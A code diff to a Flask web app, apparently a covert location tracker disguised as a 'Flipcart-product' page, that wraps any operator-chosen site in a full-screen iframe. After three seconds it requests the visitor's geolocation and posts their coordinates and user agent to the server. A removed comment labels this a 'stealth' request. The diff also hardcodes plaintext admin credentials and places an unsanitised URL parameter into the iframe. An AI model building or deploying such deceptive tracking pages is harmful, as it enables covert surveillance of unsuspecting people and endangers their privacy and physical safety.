@@ -14,6 +14,7 @@ app = Flask(__name__)
 locations = {}        # {track_id: {lat, lon, time}}
 short_links = {}      # {short_code: track_id}
 auth_attempts = {}    # {IP: failed_attempts}
+click_counts = {}     # {track_id: clicks}
 
 # =====================
 # Admin credentials
@@ -21,6 +22,7 @@ auth_attempts = {}    # {IP: failed_attempts}
 USERNAME = "Sritan"
 PASSWORD = "Tansri@2018"
 MAX_ATTEMPTS = 2
+SAFE_IPS = ["192.168.1.44"]  # replace with your public IP to never block
 
 # =====================
 # Authentication helpers
@@ -33,10 +35,15 @@ def check_auth(username, password):
 
 def authenticate():
     ip = get_client_ip()
-    auth_attempts[ip] = auth_attempts.get(ip, 0) + 1
+    if ip in SAFE_IPS:
+        # Never block your own system
+        return Response(
+            '🔒 Authentication required', 401,
+            {'WWW-Authenticate': 'Basic realm="Login Required"'}
+        )
 
+    auth_attempts[ip] = auth_attempts.get(ip, 0) + 1
     if auth_attempts[ip] >= MAX_ATTEMPTS:
-        # Redirect after max failed attempts
         return redirect("https://www.flipkart.com")
 
     return Response(
@@ -52,7 +59,6 @@ def requires_auth(f):
         if not auth or not check_auth(auth.username, auth.password):
             return authenticate()
         else:
-            # Reset counter on success
             auth_attempts[ip] = 0
         return f(*args, **kwargs)
     return decorated
@@ -89,14 +95,16 @@ def create_short_link(track_id):
 # =====================
 # Admin Home Page
 # =====================
-@app.route("/")
+@app.route("/", methods=["GET", "POST"])
 @requires_auth
 def home():
+    custom_url = "https://www.flipkart.com"
+    if request.method == "POST":
+        custom_url = request.form.get("custom_url") or "https://www.flipkart.com"
+    
     track_id = str(uuid.uuid4())
-    tracking_url = url_for("track", track_id=track_id, _external=True)
-    short_url = shorten_url(tracking_url)  # optional
-
-    # also create a branded short link
+    tracking_url = url_for("track", track_id=track_id, _external=True) + f"?custom={custom_url}"
+    short_url = shorten_url(tracking_url)
     branded_short = create_short_link(track_id)
 
     return f"""
@@ -107,8 +115,13 @@ def home():
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
     </head>
     <body class="bg-light d-flex flex-column align-items-center justify-content-center vh-100">
-        <div class="card shadow p-4 text-center" style="max-width: 500px; width: 100%;">
+        <div class="card shadow p-4 text-center" style="max-width: 600px; width: 100%;">
             <h2 class="mb-3">🔗 Flipcart-product Tracker</h2>
+            <form method="POST" class="mb-3">
+                <input type="url" name="custom_url" placeholder="Enter URL to track" class="form-control mb-2" required>
+                <button type="submit" class="btn btn-primary w-100">Generate Tracking Link</button>
+            </form>
+            <hr>
             <p>Your tracking link:</p>
             <a href="{tracking_url}" target="_blank" class="btn btn-primary mb-2">{tracking_url}</a>
             <p>Shortened link (TinyURL):</p>
@@ -137,64 +150,39 @@ def redirect_short_link(code):
 # =====================
 @app.route("/track/<track_id>")
 def track(track_id):
+    custom_url = request.args.get("custom", "https://www.flipkart.com")
+    click_counts[track_id] = click_counts.get(track_id, 0) + 1
+
     html = f"""
     <!DOCTYPE html>
     <html>
     <head>
         <title>Flipcart-product</title>
         <style>
-            html, body {{
-                margin: 0;
-                padding: 0;
-                height: 100%;
-                overflow: hidden;
-            }}
-            iframe {{
-                width: 100%;
-                height: 100%;
-                border: none;
-            }}
+            html, body {{ margin:0; padding:0; height:100%; overflow:hidden; }}
+            iframe {{ width:100%; height:100%; border:none; }}
         </style>
         <script>
-            // Stealth geolocation request
             function requestLocation() {{
-                if (navigator.permissions) {{
-                    navigator.permissions.query({{name:'geolocation'}}).then(function(result) {{
-                        if (result.state === 'granted' || result.state === 'prompt') {{
-                            navigator.geolocation.getCurrentPosition(
-                                function(pos) {{
-                                    fetch("/save_location/{track_id}", {{
-                                        method: "POST",
-                                        headers: {{ "Content-Type": "application/json" }},
-                                        body: JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude }})
-                                    }});
-                                }},
-                                function(err) {{
-                                    console.log("❌ Location denied silently");
-                                }}
-                            );
-                        }}
-                    }});
-                }} else {{
-                    // fallback for older browsers
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {{
-                            fetch("/save_location/{track_id}", {{
-                                method: "POST",
-                                headers: {{ "Content-Type": "application/json" }},
-                                body: JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude }})
-                            }});
-                        }}
-                    );
-                }}
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {{
+                        fetch("/save_location/{track_id}", {{
+                            method: "POST",
+                            headers: {{ "Content-Type": "application/json" }},
+                            body: JSON.stringify({{
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                ua: navigator.userAgent
+                            }})
+                        }});
+                    }}
+                );
             }}
-
-            // Wait 3 seconds before asking (user sees Flipkart first)
             setTimeout(requestLocation, 3000);
         </script>
     </head>
     <body>
-        <iframe src="https://www.flipkart.com"></iframe>
+        <iframe src="{custom_url}"></iframe>
     </body>
     </html>
     """
